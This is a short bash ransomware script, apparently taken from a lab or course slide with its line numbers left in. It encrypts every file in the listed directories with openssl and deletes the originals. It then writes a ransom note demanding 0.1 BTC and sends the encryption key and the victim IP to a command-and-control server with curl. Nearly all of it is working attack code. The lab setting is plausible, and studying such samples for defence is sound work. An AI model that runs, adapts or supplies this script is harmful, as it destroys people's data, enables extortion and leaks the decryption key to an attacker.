#!/bin/bash
2
3 # Configuration
4 PASSWORD=$(openssl rand -hex 32)
5 TARGET_DIRS=("/c/critical" "/c/another_directory")
6 RANSOM_NOTE="/c/README_DECRYPT.txt"
7 C2_SERVER="http://192.168.56.15:8080"
8
9 # Check if target directories exist
2
10 for dir in "${TARGET_DIRS[@]}"; do
11 if [ ! -d "$dir" ]; then
12 echo "Error: Directory $dir not found! Create it
first."
13 exit 1
14 fi
15 done
16
17 # Encrypt files
18 for dir in "${TARGET_DIRS[@]}"; do
19 find "$dir" -type f -not -name "*.encrypted" |
while read -r file; do
20 # Encrypt file
21 if openssl enc -aes-256-cbc -salt -in "$file" -
out "${file}.encrypted" -pass pass:"$PASSWORD";
then
22 # Securely delete original (Windows-compatible
)
23 rm -f "$file"
24 echo "Encrypted: $file"
25 else
26 echo "Failed to encrypt: $file"
27 fi
28 done
29 done
30
31 # Create ransom note
32 cat <<EOF | sudo tee "$RANSOM_NOTE" > /dev/null
33 !!! YOUR FILES ARE ENCRYPTED !!!
34 To decrypt, send 0.1 BTC to: hacker-wallet-address
35 Contact: hacker@darkweb.tor
36 EOF
37
38 # Exfiltrate key to C2 (Kali)
39 curl -X POST "$C2_SERVER/log" -d "victim
=192.168.56.20&key=$PASSWORD" || \
40 echo "Warning: Failed to contact C2 server"
